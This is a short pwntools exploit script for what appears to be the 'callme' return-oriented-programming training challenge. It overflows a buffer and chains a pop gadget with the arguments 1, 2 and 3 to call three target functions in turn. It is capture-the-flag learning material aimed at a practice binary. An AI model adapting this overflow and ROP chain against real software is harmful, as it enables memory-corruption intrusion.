from pwn import *

#p = process("./callme")
p = gdb.debug("./callme", "b main")
p.recvuntil("> ")
p.sendline("A"*40+p64(0x00401aab)+p64(1)+p64(2)+p64(3)+p64(0x401850)+p64(0x401996)) #pop rdi, rsi,rdx -> callme_one -> jump to main
p.recvuntil("> ")
p.sendline("A"*40+p64(0x00401aab)+p64(1)+p64(2)+p64(3)+p64(0x401870)+p64(0x401996))
p.recvuntil("> ")
p.sendline("A"*40+p64(0x00401aab)+p64(1)+p64(2)+p64(3)+p64(0x401810)+p64(0x401996))
p.interactive()
